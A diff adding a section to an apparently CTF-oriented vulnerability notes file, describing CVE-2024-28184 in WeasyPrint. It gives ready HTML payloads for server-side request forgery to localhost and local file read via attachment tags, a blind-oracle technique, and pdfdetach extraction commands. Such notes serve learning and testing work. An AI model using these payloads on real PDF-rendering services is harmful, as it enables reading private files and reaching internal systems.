@@ -201,6 +201,27 @@ Server distinguishes SSH from HTTP by first bytes. When challenge mentions "fewe
 
 ---
 
+## CVE-2024-28184: WeasyPrint Attachment SSRF / File Read
+
+**Affected:** WeasyPrint (multiple versions)
+
+**Vulnerability:** WeasyPrint processes `<a rel="attachment">` and `<link rel="attachment">` tags, fetching referenced URLs and embedding results as PDF attachments. Internal header checks (e.g., `X-Fetcher`) are NOT applied to attachment fetches.
+
+**Attack vectors:**
+1. **SSRF:** `<a rel="attachment" href="http://127.0.0.1/admin/flag">` -- fetches from localhost, bypasses IP restrictions
+2. **Local file read:** `<link rel="attachment" href="file:///flag.txt">` -- embeds local files in PDF
+3. **Blind oracle:** Attachment only appears in PDF if target returns 200 -- use presence of `/Type /EmbeddedFile` as boolean oracle
+
+**Extraction:**
+```bash
+pdfdetach -list output.pdf        # List embedded files
+pdfdetach -save 1 -o flag.txt output.pdf  # Extract
+```
+
+**Detection:** URL-to-PDF conversion feature, WeasyPrint in `requirements.txt` or `Pipfile`.
+
+---
+
 ## Detection Checklist
 
 1. **Framework versions** in `package.json`, `requirements.txt`, `Dockerfile`
